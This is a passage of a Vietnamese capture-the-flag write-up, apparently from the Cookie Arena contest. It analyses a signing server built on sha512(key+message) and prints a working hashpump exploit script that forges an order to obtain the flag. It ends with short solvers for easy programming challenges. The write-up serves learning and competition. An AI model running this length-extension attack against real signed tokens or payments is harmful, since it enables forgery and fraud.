                                 <span class="p">(</span><span class="n">idx</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="n">item</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">item</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span>

    <span class="k">def</span> <span class="nf">order</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="bp">self</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="n">sendall</span><span class="p">(</span><span class="sa">b</span><span class="s">'ID: '</span><span class="p">)</span>
            <span class="n">pid</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">rfile</span><span class="p">.</span><span class="n">readline</span><span class="p">().</span><span class="n">decode</span><span class="p">())</span>
        <span class="k">except</span> <span class="nb">ValueError</span><span class="p">:</span>
            <span class="bp">self</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="n">sendall</span><span class="p">(</span>
                <span class="sa">b</span><span class="s">'THIS IS A CRYPTOGRAPHIC CHALLENGE!!!</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
            <span class="k">return</span>

        <span class="k">if</span> <span class="n">pid</span> <span class="o">&lt;</span> <span class="mi">1</span> <span class="ow">or</span> <span class="n">pid</span> <span class="o">&gt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">items</span><span class="p">):</span>
            <span class="bp">self</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="n">sendall</span><span class="p">(</span><span class="sa">b</span><span class="s">'Ohh~</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
            <span class="k">return</span>

        <span class="n">payment</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'product=%s&amp;price=%d&amp;time=%.02f'</span> <span class="o">%</span> <span class="p">(</span>
            <span class="n">items</span><span class="p">[</span><span class="n">pid</span><span class="o">-</span><span class="mi">1</span><span class="p">][</span><span class="mi">0</span><span class="p">],</span> <span class="n">items</span><span class="p">[</span><span class="n">pid</span><span class="o">-</span><span class="mi">1</span><span class="p">][</span><span class="mi">1</span><span class="p">],</span> <span class="n">datetime</span><span class="p">.</span><span class="n">datetime</span><span class="p">.</span><span class="n">now</span><span class="p">().</span><span class="n">timestamp</span><span class="p">())</span>
        <span class="n">signature</span> <span class="o">=</span> <span class="n">sha512</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">signkey</span><span class="o">+</span><span class="n">payment</span><span class="p">).</span><span class="n">hexdigest</span><span class="p">()</span>
        <span class="n">payment</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">'&amp;sign=%s'</span> <span class="o">%</span> <span class="n">signature</span><span class="p">.</span><span class="n">encode</span><span class="p">()</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="n">sendall</span><span class="p">(</span><span class="sa">b</span><span class="s">'Your order: '</span><span class="p">)</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">b64encode</span><span class="p">(</span><span class="n">payment</span><span class="p">))</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="n">sendall</span><span class="p">(</span><span class="sa">b</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">confirm</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="bp">self</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="n">sendall</span><span class="p">(</span><span class="sa">b</span><span class="s">'Your order: '</span><span class="p">)</span>
            <span class="n">payment</span> <span class="o">=</span> <span class="n">b64decode</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">rfile</span><span class="p">.</span><span class="n">readline</span><span class="p">().</span><span class="n">rstrip</span><span class="p">(</span><span class="sa">b</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">))</span>
        <span class="k">except</span> <span class="nb">Exception</span><span class="p">:</span>
            <span class="bp">self</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="n">sendall</span><span class="p">(</span>
                <span class="sa">b</span><span class="s">'THIS IS A CRYPTOGRAPHIC CHALLENGE!!!</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
            <span class="k">return</span>

        <span class="n">pos</span> <span class="o">=</span> <span class="n">payment</span><span class="p">.</span><span class="n">rfind</span><span class="p">(</span><span class="sa">b</span><span class="s">'&amp;sign='</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">pos</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
            <span class="bp">self</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="n">sendall</span><span class="p">(</span><span class="sa">b</span><span class="s">'Invalid order</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
            <span class="k">return</span>

        <span class="n">signature</span> <span class="o">=</span> <span class="n">payment</span><span class="p">[</span><span class="n">pos</span> <span class="o">+</span> <span class="mi">6</span><span class="p">:]</span>
        <span class="k">if</span> <span class="n">sha512</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">signkey</span><span class="o">+</span><span class="n">payment</span><span class="p">[:</span><span class="n">pos</span><span class="p">]).</span><span class="n">hexdigest</span><span class="p">().</span><span class="n">encode</span><span class="p">()</span> <span class="o">!=</span> <span class="n">signature</span><span class="p">:</span>
            <span class="bp">self</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="n">sendall</span><span class="p">(</span><span class="sa">b</span><span class="s">'Invalid order</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
            <span class="k">return</span>

        <span class="n">m</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">parse_qsl</span><span class="p">(</span><span class="n">payment</span><span class="p">[:</span><span class="n">pos</span><span class="p">])</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">pname</span> <span class="o">=</span> <span class="n">m</span><span class="p">[</span><span class="sa">b</span><span class="s">'product'</span><span class="p">]</span>
            <span class="n">price</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">m</span><span class="p">[</span><span class="sa">b</span><span class="s">'price'</span><span class="p">])</span>
        <span class="k">except</span> <span class="p">(</span><span class="nb">KeyError</span><span class="p">,</span> <span class="nb">ValueError</span><span class="p">,</span> <span class="nb">IndexError</span><span class="p">):</span>
            <span class="bp">self</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="n">sendall</span><span class="p">(</span><span class="sa">b</span><span class="s">'Invalid order</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
            <span class="k">return</span>

        <span class="k">if</span> <span class="n">price</span> <span class="o">&gt;</span> <span class="bp">self</span><span class="p">.</span><span class="n">money</span><span class="p">:</span>
            <span class="bp">self</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="n">sendall</span><span class="p">(</span><span class="sa">b</span><span class="s">'Oops</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
            <span class="k">return</span>

        <span class="bp">self</span><span class="p">.</span><span class="n">money</span> <span class="o">-=</span> <span class="n">price</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="n">sendall</span><span class="p">(</span>
            <span class="sa">b</span><span class="s">'Transaction is completed. Your balance: $%d</span><span class="se">\n</span><span class="s">'</span> <span class="o">%</span> <span class="bp">self</span><span class="p">.</span><span class="n">money</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">pname</span> <span class="o">==</span> <span class="sa">b</span><span class="s">'FLAG'</span><span class="p">:</span>
            <span class="k">print</span><span class="p">(</span><span class="s">"{} solved the challenge"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">client_address</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span>
            <span class="bp">self</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="n">sendall</span><span class="p">(</span><span class="sa">b</span><span class="s">'Here is your flag: %s</span><span class="se">\n</span><span class="s">'</span> <span class="o">%</span> <span class="n">get_flag</span><span class="p">())</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="bp">self</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="n">sendall</span><span class="p">(</span>
                <span class="sa">b</span><span class="s">'%s will be delivered to your in-game mailbox soon</span><span class="se">\n</span><span class="s">'</span> <span class="o">%</span> <span class="n">pname</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">parse_qsl</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">query</span><span class="p">):</span>
        <span class="n">m</span> <span class="o">=</span> <span class="p">{}</span>
        <span class="n">parts</span> <span class="o">=</span> <span class="n">query</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s">'&amp;'</span><span class="p">)</span>
        <span class="k">for</span> <span class="n">part</span> <span class="ow">in</span> <span class="n">parts</span><span class="p">:</span>
            <span class="n">key</span><span class="p">,</span> <span class="n">val</span> <span class="o">=</span> <span class="n">part</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s">'='</span><span class="p">)</span>
            <span class="n">m</span><span class="p">[</span><span class="n">key</span><span class="p">]</span> <span class="o">=</span> <span class="n">val</span>
        <span class="k">return</span> <span class="n">m</span>


<span class="k">class</span> <span class="nc">ThreadedTCPServer</span><span class="p">(</span><span class="n">socketserver</span><span class="p">.</span><span class="n">ThreadingMixIn</span><span class="p">,</span> <span class="n">socketserver</span><span class="p">.</span><span class="n">TCPServer</span><span class="p">):</span>
    <span class="k">pass</span>


<span class="k">def</span> <span class="nf">main</span><span class="p">(</span><span class="n">argv</span><span class="p">):</span>
    <span class="n">host</span><span class="p">,</span> <span class="n">port</span> <span class="o">=</span> <span class="s">'localhost'</span><span class="p">,</span> <span class="mi">8000</span>

    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">argv</span><span class="p">)</span> <span class="o">==</span> <span class="mi">2</span><span class="p">:</span>
        <span class="n">port</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
    <span class="k">elif</span> <span class="nb">len</span><span class="p">(</span><span class="n">argv</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">3</span><span class="p">:</span>
        <span class="n">host</span><span class="p">,</span> <span class="n">port</span> <span class="o">=</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nb">int</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>

    <span class="n">sys</span><span class="p">.</span><span class="n">stderr</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="s">'Listening {}:{}</span><span class="se">\n</span><span class="s">'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
    <span class="n">server</span> <span class="o">=</span> <span class="n">ThreadedTCPServer</span><span class="p">((</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">),</span> <span class="n">RequestHandler</span><span class="p">)</span>
    <span class="n">server</span><span class="p">.</span><span class="n">daemon_threads</span> <span class="o">=</span> <span class="bp">True</span>
    <span class="n">server</span><span class="p">.</span><span class="n">allow_reuse_address</span> <span class="o">=</span> <span class="bp">True</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">server</span><span class="p">.</span><span class="n">serve_forever</span><span class="p">()</span>
    <span class="k">except</span> <span class="nb">KeyboardInterrupt</span><span class="p">:</span>
        <span class="k">pass</span>
    <span class="n">server</span><span class="p">.</span><span class="n">server_close</span><span class="p">()</span>


<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
    <span class="n">main</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span>
</code></pre></div></div>

<p>Oce c√°i file n√†y khi·∫øn t√¥i ƒëau ƒë·∫ßu, nh∆∞ng sau khi ng·ªìi t·ª± k·ªâ trong 10p th√¨ m√¨nh ƒë√£ ch√∫ √Ω ƒë·∫øn h√†m order:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">payment</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'product=%s&amp;price=%d&amp;time=%.02f'</span> <span class="o">%</span> <span class="p">(</span>
            <span class="n">items</span><span class="p">[</span><span class="n">pid</span><span class="o">-</span><span class="mi">1</span><span class="p">][</span><span class="mi">0</span><span class="p">],</span> <span class="n">items</span><span class="p">[</span><span class="n">pid</span><span class="o">-</span><span class="mi">1</span><span class="p">][</span><span class="mi">1</span><span class="p">],</span> <span class="n">datetime</span><span class="p">.</span><span class="n">datetime</span><span class="p">.</span><span class="n">now</span><span class="p">().</span><span class="n">timestamp</span><span class="p">())</span>
        <span class="n">signature</span> <span class="o">=</span> <span class="n">sha512</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">signkey</span><span class="o">+</span><span class="n">payment</span><span class="p">).</span><span class="n">hexdigest</span><span class="p">()</span>
        <span class="n">payment</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">'&amp;sign=%s'</span> <span class="o">%</span> <span class="n">signature</span><span class="p">.</span><span class="n">encode</span><span class="p">()</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="n">sendall</span><span class="p">(</span><span class="sa">b</span><span class="s">'Your order: '</span><span class="p">)</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">b64encode</span><span class="p">(</span><span class="n">payment</span><span class="p">))</span>
</code></pre></div></div>

<p>Nh√¨n th·∫•y sha512 th√¨ m√¨nh c≈©ng h∆°i ng·ªù ng·ªù ƒë√¢y l√† <code class="language-plaintext highlighter-rouge">hash length extension attack</code>.</p>

<p>Signkey ƒë∆∞·ª£c ch√®n v√†o s·∫Ω c√≥ ƒë·ªô d√†i random t·ª´ 8 ƒë·∫øn 32, kh√¥ng bi·∫øt c·ª• th·ªÉ l√† g√¨ n√™n l·∫°i brute, brute ƒë·∫øn ch·∫øt :ƒê</p>

<p>H√†m parse_qsl d√πng ƒë·ªÉ t√°ch c√°c th√†nh ph·∫ßn ra, m√¨nh s·∫Ω th√™m chu·ªói ‚Äúproduct=FLAG‚Äù sau khi ch·ªçn mua m√≥n h√†ng ƒë·∫ßu ti√™n. M√† m√≥n h√†ng ƒë·∫ßu ti√™n lu√¥n l√† gi√° 1ƒë. Th√¨ sau khi m√¨nh truy·ªÅn chu·ªói sau khi th√™m ‚Äúproduct=FLAG‚Äù, h√†m parse_qsl s·∫Ω th·ª±c thi v√† m√≥n h√†ng m√¨nh mua s·∫Ω l√† FLAG, ch·ª© kh√¥ng ph·∫£i l√† m√≥n h√†ng ƒë·∫ßu ti√™n n·ªØa. C√°i n√†y c≈©ng h∆°i n√° n√° gi·ªëng attack v√†o AES EBC mode nh·ªâ h√™ h√™ =))</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="n">b64encode</span><span class="p">,</span> <span class="n">b64decode</span>
<span class="kn">from</span> <span class="nn">hashpumpy</span> <span class="kn">import</span> <span class="n">hashpump</span>

<span class="k">def</span> <span class="nf">parse_qsl</span><span class="p">(</span><span class="n">query</span><span class="p">):</span>
    <span class="n">m</span> <span class="o">=</span> <span class="p">{}</span>
    <span class="n">parts</span> <span class="o">=</span> <span class="n">query</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s">'&amp;'</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">part</span> <span class="ow">in</span> <span class="n">parts</span><span class="p">:</span>
        <span class="n">key</span><span class="p">,</span> <span class="n">val</span> <span class="o">=</span> <span class="n">part</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s">'='</span><span class="p">)</span>
        <span class="n">m</span><span class="p">[</span><span class="n">key</span><span class="p">]</span> <span class="o">=</span> <span class="n">val</span>
    <span class="k">return</span> <span class="n">m</span>

<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
    <span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'chal1.crypto.letspentest.org'</span><span class="p">,</span> <span class="mi">7000</span><span class="p">)</span>

    <span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">'2'</span><span class="p">)</span>
    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">'1'</span><span class="p">)</span>
    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'Your order: '</span><span class="p">)</span>
    <span class="n">payment</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
    <span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>

    <span class="n">payment</span> <span class="o">=</span> <span class="n">b64decode</span><span class="p">(</span><span class="n">payment</span><span class="p">)</span>
    <span class="n">signature</span> <span class="o">=</span> <span class="n">parse_qsl</span><span class="p">(</span><span class="n">payment</span><span class="p">)</span>
    <span class="n">signature</span> <span class="o">=</span> <span class="n">signature</span><span class="p">[</span><span class="sa">b</span><span class="s">'sign'</span><span class="p">]</span>

    <span class="n">payment</span> <span class="o">=</span> <span class="n">payment</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s">'&amp;'</span><span class="p">)</span>
    <span class="k">del</span> <span class="n">payment</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>
    <span class="n">payment</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'&amp;'</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">payment</span><span class="p">)</span>

    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="mi">33</span><span class="p">):</span>
        <span class="n">new_signature</span><span class="p">,</span> <span class="n">new_data</span> <span class="o">=</span> <span class="n">hashpump</span><span class="p">(</span><span class="n">signature</span><span class="p">,</span> <span class="n">payment</span><span class="p">,</span> <span class="s">'&amp;product=FLAG'</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span>
        
        <span class="n">payload</span> <span class="o">=</span> <span class="n">new_data</span> <span class="o">+</span> <span class="sa">b</span><span class="s">'&amp;sign='</span> <span class="o">+</span> <span class="n">new_signature</span><span class="p">.</span><span class="n">encode</span><span class="p">()</span>
        <span class="n">payload</span> <span class="o">=</span> <span class="n">b64encode</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
        
        <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">'3'</span><span class="p">)</span>
        <span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
        <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
        <span class="n">result</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
        <span class="k">if</span> <span class="sa">b</span><span class="s">'Invalid order'</span> <span class="ow">in</span> <span class="n">result</span><span class="p">:</span>
            <span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
            <span class="k">continue</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="k">print</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvline</span><span class="p">())</span>
            <span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</code></pre></div></div>

<p>Sau m·ªôt h·ªìi ch·∫°y th√¨ ta nh·∫≠n ƒë∆∞·ª£c flag, nh∆∞ng kh√¥ng bi·∫øt do server l·ªói hay c·ªë t√¨nh m√† flag format l·∫°i l√† FLag ch·ª© kh√¥ng ph·∫£i l√† Flag, ƒë·ªÅ ngh·ªã M√®o Yang H·ªì, Hazy ki·ªÉm ƒëi·ªÉm v√† t·ª± ki·ªÉm ƒëi·ªÉm =))</p>

<p>Flag: <code class="language-plaintext highlighter-rouge">Flag{hashlengthextensionattack}</code></p>

<h1 id="programming">PROGRAMMING</h1>

<h2 id="sum">SUM()</h2>
<blockquote>
  <p>B·ªè qua t·∫•t c·∫£ c√°c t√≠ch ph√¢n, ƒë·∫°o h√†m, ma tr·∫≠n, s√°c xu·∫•t. G√† h√£y k·∫øt n·ªëi t·ªõi m√°y ch·ªß c·ªßa Cookie Arena v√† th·ª±c hi·ªán t√≠nh t·ªïng c·ªßa d√£y s·ªë ƒë√£ cho m·ªôt c√°ch nhanh nh·∫•t.</p>

  <p>H√£y h·ªçc c√°ch s·ª≠ d·ª•ng Python v√† player.py ƒë·ªÉ gi·∫£i to√°n nha</p>

  <p>programming.letspentest.org 8111</p>
</blockquote>

<p>ƒê√¢y ch·ªâ l√† b√†i t√≠nh t·ªïng c√°c s·ªë c∆° b·∫£n, ch·ªâ c·∫ßn th√™m ƒëo·∫°n script python ƒë·ªÉ x·ª≠ l√Ω d·ªØ li·ªáu nh·∫≠n ƒë∆∞·ª£c, typecast l√† xong.</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">solver</span><span class="p">(</span><span class="n">received</span><span class="p">):</span>
    <span class="n">list_line</span> <span class="o">=</span> <span class="n">received</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">list_line</span><span class="p">:</span>
        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">line</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
            <span class="k">if</span> <span class="n">line</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">isdigit</span><span class="p">():</span>
                <span class="k">return</span> <span class="nb">sum</span><span class="p">([</span><span class="nb">int</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">line</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">' '</span><span class="p">)</span> <span class="k">if</span> <span class="n">c</span><span class="p">.</span><span class="n">isdigit</span><span class="p">()])</span>
</code></pre></div></div>
<p>Flag: <code class="language-plaintext highlighter-rouge">Flag{1plust1_1s_2_qu1ck_mafth}</code></p>

<h2 id="pro102">Pro102</h2>
<blockquote>
  <p>R·ªìi m·ªôt ng√†y kia m·∫Øt anh tr√≤n xoe nh∆∞ ƒë∆∞·ªùng tr√≤n l∆∞·ª£ng gi√°c Khi b·∫•t ng·ªù m·ªôt b√†i to√°n b·∫≠c 2 C·ª© l·∫ßm t∆∞·ªüng r·∫±ng nghi·ªám duy nh·∫•t v·ªõi ai Th·∫≠t kinh ho√†ng ph∆∞∆°ng tr√¨nh v√¥ nghi·ªám</p>

  <p>(st)</p>

  <p>programming.letspentest.org 8222</p>
</blockquote>

<p>√Ä th√¨‚Ä¶ ƒë√¢y l√† b√†i gi·∫£i ph∆∞∆°ng tr√¨nh b·∫≠c 2, v·∫´n l√† code c∆° b·∫£n th√¥i, c≈©ng kh√¥ng c√≥ g√¨ kh√≥ c·∫£, ƒë√¢y l√† script gi·∫£i, th√∫ th·∫≠t th√¨ m·∫•y b√†i programming d·ªÖ qu√° khi·∫øn m√¨nh h∆°i t·ª•t mood .__.</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">solver</span><span class="p">(</span><span class="n">received</span><span class="p">):</span>
    <span class="n">list_line</span> <span class="o">=</span> <span class="n">received</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">list_line</span><span class="p">:</span>
        <span class="k">if</span> <span class="s">"X^2"</span> <span class="ow">in</span> <span class="n">line</span><span class="p">:</span>
            <span class="n">line</span> <span class="o">=</span> <span class="n">line</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">' '</span><span class="p">,</span> <span class="s">''</span><span class="p">)</span>
            <span class="n">num</span> <span class="o">=</span> <span class="p">[</span><span class="nb">int</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">re</span><span class="p">.</span><span class="n">findall</span><span class="p">(</span><span class="s">'[\+-]*\d+'</span><span class="p">,</span> <span class="n">line</span><span class="p">)]</span>
            <span class="n">num</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="n">num</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">-</span> <span class="n">num</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span>
            <span class="n">delta</span> <span class="o">=</span> <span class="n">num</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">*</span> <span class="n">num</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">-</span> <span class="mi">4</span> <span class="o">*</span> <span class="n">num</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="n">num</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>
            <span class="n">ans</span> <span class="o">=</span> <span class="s">"NOPE"</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">delta</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">):</span>
                <span class="n">ans</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="nb">int</span><span class="p">((</span><span class="o">-</span> <span class="n">num</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">-</span> <span class="n">math</span><span class="p">.</span><span class="n">sqrt</span><span class="p">(</span><span class="n">delta</span><span class="p">))</span> <span class="o">/</span> <span class="p">(</span><span class="mi">2</span> <span class="o">*</span> <span class="n">num</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span><span class="si">}</span><span class="s">, </span><span class="si">{</span><span class="nb">int</span><span class="p">((</span><span class="o">-</span> <span class="n">num</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">+</span> <span class="n">math</span><span class="p">.</span><span class="n">sqrt</span><span class="p">(</span><span class="n">delta</span><span class="p">))</span> <span class="o">/</span> <span class="p">(</span><span class="mi">2</span> <span class="o">*</span> <span class="n">num</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span><span class="si">}</span><span class="s">"</span>
            <span class="k">return</span> <span class="n">ans</span>
</code></pre></div></div>

<p>Flag: <code class="language-plaintext highlighter-rouge">Flag{2fast2fur10us}</code></p>

<h2 id="roberval">Roberval</h2>
<blockquote>
  <p>Hazy ng·ªìi c√¢n nh·ªØng vi√™n bi m√¨nh ƒëang c√≥, loay hoay v·∫´n kh√¥ng bi·∫øt ph·∫£i c√¢n bao nhi√™u l·∫ßn ƒë·ªÉ t√¨m ƒë∆∞·ª£c vi√™n bi nh·∫π nh·∫•t.</p>

  <p>B·∫°n gi√∫p Hazy m·ªôt tay v·ªõi nh√©.</p>

  <p>programming.letspentest.org 8333</p>
</blockquote>

<p>ƒê√¢y th·ª±c ra l√† marble problem m√† m·∫•y b·∫°n h·ªçc sinh l√¢u l√¢u v·∫´n hay l·∫•y ƒë·ªë vui nhau ki·ªÉu ‚ÄúC√≥ N bi nh√¨n y nh∆∞ nhau trong ƒë√≥ c√≥ 1 vi√™n kh√°c c√¢n n·∫∑ng, h·ªèi s·ªë l·∫ßn c√¢n √≠t nh·∫•t ƒë·ªÉ t√¨m ra h√≤n bi nh·∫π/n·∫∑ng h∆°n.‚Äù C≈©ng kh√° bu·ªìn c∆∞·ªùi v√¨ ngay ng√†y h√¥m tr∆∞·ªõc khi thi gi·∫£i cookie th√¨ m·ªôt ng∆∞·ªùi b·∫°n c·ªßa m√¨nh ƒë√£ c√≥ b·∫°n ƒë·ªë vui v·ªÅ v·∫•n ƒë·ªÅ n√†y, m√¨nh ƒëi d·∫°o tr√™n m·∫°ng m·ªôt t√≠ v√† c≈©ng ƒë√£ t√¨m ra ƒë∆∞·ª£c c√¥ng th·ª©c t·ªïng qu√°t cho v·∫•n ƒë·ªÅ n√†y.</p>

<p>C√¥ng th·ª©c t·ªïng qu√°t: $\log_3(N)$ r·ªìi l√†m tr√≤n l√™n</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">solver</span><span class="p">(</span><span class="n">received</span><span class="p">):</span>
    <span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="n">math</span><span class="p">.</span><span class="n">ceil</span><span class="p">(</span><span class="n">math</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">re</span><span class="p">.</span><span class="n">findall</span><span class="p">(</span><span class="s">'\d+'</span><span class="p">,</span> <span class="n">received</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]),</span> <span class="mi">3</span><span class="p">)))</span>
</code></pre></div></div>

